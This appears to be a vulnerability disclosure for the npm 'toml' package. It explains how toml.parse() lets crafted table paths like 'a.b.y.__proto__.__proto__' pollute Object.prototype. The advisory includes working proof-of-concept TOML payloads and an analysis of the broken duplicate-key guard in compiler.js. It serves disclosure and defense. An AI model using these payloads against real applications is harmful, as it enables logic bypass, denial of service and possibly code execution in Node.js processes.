# toml-node: Prototype Pollution Leads to `Object.prototype` Corruption via `__proto__` Key-Path Desynchronization

- CWE: CWE-1321
- Packages: npm:toml

---

### Summary

`toml.parse()` writes attacker-controlled keys onto `Object.prototype`. The compiler protects the tables it builds by creating them with `Object.create(null)`, which neutralizes a direct `[__proto__]` table. An attacker bypasses that protection by routing a table path *through a scalar value* and into the real prototype chain: a path such as `a.b.y.__proto__.__proto__`, where `a.b.y` holds a number, resolves to `Object.prototype` and every subsequent key/value writes onto it.

The bypass succeeds because the compiler's duplicate-key guards track paths with keys that do not match the keys used during traversal. The tracking strings and the traversal strings **desynchronize**, so the guard that should reject descending through an existing scalar never fires.

### Steps to reproduce

1. Install the latest version and run the comma-desynchronization payload.

   ```bash
   npm install toml@4.1.1
   ```

   ```js
   const toml = require("toml");
   delete Object.prototype.polluted;

   toml.parse(`
   [a.b]
   y = 1
   [a.b.y.__proto__.__proto__]
   polluted = "yes"
   `);

   console.log(({}).polluted);   // -> "yes"
   ```

2. Observe that a freshly created object inherits the injected key, confirming `Object.prototype` was modified:

   ```
   yes
   ```

3. Confirm the prefix-clear variant reaches the same result:

   ```js
   toml.parse(`
   aa = 1
   [[a]]
   [aa.__proto__.__proto__]
   polluted = "yes"
   `);
   console.log(({}).polluted);   // -> "yes"
   ```

A nested gadget object is also injectable, not only scalar keys:

```js
toml.parse(`
[a.b]
y = 1
[a.b.y.__proto__.__proto__.code]
val = "arbitrary"
`);
console.log(({}).code.val);     // -> "arbitrary"
```

### Technical details

The compiler builds the result tree in `lib/compiler.js`. Tables are created with a null prototype, so a direct `[__proto__]` table only sets an ordinary own property and does not pollute:

```js
var data = Object.create(null);   // line 7 — root has no prototype
// ...
target[k] = Object.create(null);  // line 64 — intermediate tables, no prototype
```

The defect is in `deepRef`, which resolves a table path by walking each key segment of the live object graph:

```js
function deepRef(start, keys, value, off) {        // lib/compiler.js:183
  var traversedPath = "";
  var ctx = start;
  for (var i = 0; i < keys.length; i++) {
    var key = keys[i];
    traversedPath = traversedPath ? traversedPath + "." + key : key;
    if (typeof ctx[key] === "undefined") {
      if (i === keys.length - 1) { ctx[key] = value; }
      else { ctx[key] = Object.create(null); }
    } else if (i !== keys.length - 1 && valueAssignments.has(traversedPath)) {
      genError("Cannot redefine existing key '" + traversedPath + "'.", off);  // line 197 — the guard
    }
    ctx = ctx[key];                                // line 200 — follows __proto__ into the prototype chain
    if (ctx instanceof Array && ctx.length && i < keys.length - 1) {
      ctx = ctx[ctx.length - 1];
    }
  }
  return ctx;
}
```

Two problems combine:

**1. `deepRef` treats `__proto__` (and `constructor`, `prototype`) as ordinary traversable keys.** Line 200 executes `ctx = ctx[key]` for every segment with no reserved-key check. When traversal reaches a scalar value — for example the number `1` stored at `a.b.y` — the next two `__proto__` segments evaluate to `Number.prototype` and then `Object.prototype`. The null-prototype hardening covers only the *container tables* the compiler creates; it does not cover the *values* stored in them, and those values carry normal prototypes.

**2. The guard on line 197 is defeated by a path-format desynchronization.** `currentPath` is assigned two incompatible types: `setPath` stores an **array** (`currentPath = path`, line 151) while `addTableArray` stores a **string** (`currentPath = quotedPath`, line 172). When `assign` later builds the path of a value, it concatenates that array with a string:

```js
var fullPath = currentPath ? currentPath + "." + keys.join(".") : keys.join("."); // line 77
valueAssignments.add(fullPath);                                                   // line 86
```

For the table `[a.b]`, `currentPath` is the array `["a","b"]`, so `currentPath + "."` coerces it via `Array.toString()` to the **comma-joined** string `"a,b"`. The value `y = 1` is therefore recorded as `"a,b.y"`. But `deepRef`, walking the path `a.b.y.__proto__.__proto__`, builds `traversedPath` with dots and checks `valueAssignments.has("a.b.y")`. The set contains `"a,b.y"`, not `"a.b.y"`, so the lookup misses and the guard never raises "Cannot redefine existing key". Traversal proceeds through the scalar `1` into `Object.prototype`.

Instrumenting the tracking sets after parsing the payload confirms the mismatch:

```
assignedPaths    : [ "a.b", "a,b.y", "a.b.y.__proto__.__proto__", ... ]
valueAssignments : [ "a,b.y", ... ]
deepRef checks valueAssignments.has("a.b.y")  ->  false   (recorded as "a,b.y")
```

A second route reaches the same state without the comma trick. A table array `[[a]]` triggers the prefix-clearing loop in `addTableArray`, which deletes tracking entries by string prefix and wipes the guard state before the `__proto__` descent:

```js
assignedPaths.forEach(function(p) {                 // lines 164-166
  if (p.indexOf(quotedPath) === 0) assignedPaths.delete(p);
});
valueAssignments.forEach(function(p) {              // lines 167-169
  if (p.indexOf(quotedPath) === 0) valueAssignments.delete(p);
});
```

### Impact

- Any application that calls `toml.parse()` on a TOML document an attacker can influence — uploaded configuration, project manifests, multi-tenant settings, package metadata — allows the attacker to write arbitrary properties onto `Object.prototype`.
- Injected properties become visible on every object in the process. Depending on application gadgets, this enables denial of service (corrupting properties the runtime relies on), logic and authorization bypass (overriding flags read from plain objects), and, with a suitable sink, remote code execution.
- The blast radius is the whole Node.js process, not just the parsed result object.
- `toml` reports roughly 14.8 million weekly downloads and around 1,340 dependents, so the transitive exposure is large. Dependents that pass `toml` as the engine to front-matter or configuration loaders inherit the issue.

---

Credit: Duy Bui / @[calif.io](http://calif.io/)
